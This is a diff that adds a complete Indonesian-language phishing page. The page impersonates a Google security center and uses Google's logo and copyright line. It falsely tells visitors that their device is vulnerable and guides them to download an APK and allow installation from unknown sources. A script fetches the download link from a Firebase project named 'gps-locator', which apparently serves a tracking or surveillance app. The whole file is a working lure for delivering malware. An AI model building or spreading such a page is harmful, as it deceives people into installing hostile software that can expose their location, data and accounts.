@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Security Center - Pembaruan Diperlukan</title>
+    <style>
+        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: white; width: 90%; max-width: 450px; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; border-top: 5px solid #4285f4; }
+        .logo { width: 60px; margin-bottom: 20px; }
+        h1 { color: #202124; font-size: 24px; margin-bottom: 15px; }
+        p { color: #5f6368; line-height: 1.5; margin-bottom: 25px; }
+        .warning-box { background: #fff3cd; color: #856404; padding: 15px; border-radius: 8px; font-size: 14px; margin-bottom: 25px; border: 1px solid #ffeeba; text-align: left; display: flex; align-items: center; gap: 10px; }
+        .btn-download { background-color: #4285f4; color: white; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; text-decoration: none; display: inline-block; width: 100%; box-sizing: border-box; transition: background 0.3s; }
+        .btn-download:hover { background-color: #3367d6; }
+        .footer { margin-top: 30px; font-size: 12px; color: #9aa0a6; }
+        .steps { text-align: left; font-size: 13px; color: #5f6368; margin-top: 20px; padding: 15px; background: #f1f3f4; border-radius: 8px; }
+        .steps b { color: #202124; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="logo">
+        <h1>Pusat Keamanan Sistem</h1>
+
+        <div class="warning-box">
+            <span>⚠️</span>
+            <span><b>Peringatan:</b> Perangkat Anda terdeteksi memiliki kerentanan keamanan kritis. Pembaruan sistem diperlukan segera.</span>
+        </div>
+
+        <p>Instal patch keamanan resmi Google untuk melindungi data pribadi, lokasi, dan akun Anda dari ancaman pihak ketiga.</p>
+
+        <!-- TOMBOL DOWNLOAD AKAN DIUPDATE OTOMATIS OLEH JS -->
+        <a href="#" id="btn-main" class="btn-download">SISTEM SEDANG MENYIAPKAN...</a>
+
+        <div class="steps">
+            <b>Langkah Instalasi:</b><br>
+            1. Klik tombol di atas untuk mengunduh.<br>
+            2. Buka file APK yang sudah diunduh.<br>
+            3. Jika muncul "Install dari sumber tidak dikenal", pilih <b>Izinkan/Settings</b>.<br>
+            4. Klik <b>Instal</b> dan buka aplikasi untuk verifikasi.
+        </div>
+
+        <div class="footer">
+            © 2026 Google LLC. Semua hak dilindungi undang-undang.<br>
+            Android System Security Service v15.4
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAbgFpi0FSEGrezBkircI3kUPjkgxs5mo4",
+            authDomain: "gps-locator-956fb.firebaseapp.com",
+            databaseURL: "https://gps-locator-956fb-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "gps-locator-956fb",
+            storageBucket: "gps-locator-956fb.firebasestorage.app",
+            messagingSenderId: "199650829901",
+            appId: "1:199650829901:android:b99439f65cf4aed4b2de04"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const btn = document.getElementById("btn-main");
+
+        // Ambil link APK terbaru dari database
+        onValue(ref(db, 'config/apk_download_url'), (snapshot) => {
+            const url = snapshot.val();
+            if (url) {
+                btn.href = url;
+                btn.innerText = "INSTAL PEMBARUAN (APK)";
+            } else {
+                btn.innerText = "LINK BELUM TERSEDIA";
+            }
+        });
+    </script>
+</body>
+</html>
